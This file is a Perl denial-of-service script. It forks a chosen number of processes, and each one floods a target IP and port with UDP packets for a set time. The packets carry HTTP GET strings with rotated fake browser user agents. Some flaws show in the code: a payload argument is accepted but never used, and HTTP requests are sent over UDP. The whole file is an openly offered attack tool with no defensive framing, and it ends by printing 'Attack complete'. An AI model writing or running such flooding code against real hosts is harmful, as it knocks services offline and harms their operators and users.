#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;

# Check command-line arguments
my $num_args = $#ARGV + 1;
if ($num_args != 5) {
    print "Usage: $0 <target_IP> <target_port> <attack_time> <num_threads> <payload>\n";
    exit;
}

# Extract command-line arguments
my ($target_ip, $target_port, $attack_time, $num_threads, $payload) = @ARGV;

# Generate random user agents
my @user_agents = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.254",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Vivaldi/4.0.2312.23",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Brave/91.1.25.72",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 DuckDuckGo/1.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 YandexSearch/21.6.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 BingBot/2.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Baiduspider/2.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Qwantify/1.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Twitter/1.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 GitHub/1.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Reddit/1.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Amazon/1.0",
);

# Generate random payloads
my @payloads = (
    "GET / HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\n\r\n",
    "GET /index.html HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\n\r\n",
    "GET /home HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\n\r\n",
    "GET /admin HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agents[int(rand(@user_agents))]\r\n\r\n",
    # Add more payloads here if needed
);

# Attack loop
for (1..$num_threads) {
    my $pid = fork();
    if ($pid) {
        # Parent process
        next;
    } elsif ($pid == 0) {
        # Child process
        my $start_time = time();
        my $end_time = $start_time + $attack_time;
        my $socket;
        while (time() < $end_time) {
            my $user_agent = $user_agents[int(rand(@user_agents))];
            my $payload = $payloads[int(rand(@payloads))];
            my $header = "GET / HTTP/1.1\r\nHost: $target_ip:$target_port\r\nUser-Agent: $user_agent\r\n";
            my $udp_socket = IO::Socket::INET->new(
                Proto => 'udp',
                PeerAddr => $target_ip,
                PeerPort => $target_port,
            ) or die "Error in socket creation: $!\n";
            $udp_socket->send($payload);
        }
        exit;
    } else {
        print "Error forking process: $!\n";
    }
}

# Wait for all child processes to finish
for (1..$num_threads) {
    wait();
}

print "Attack complete.\n";
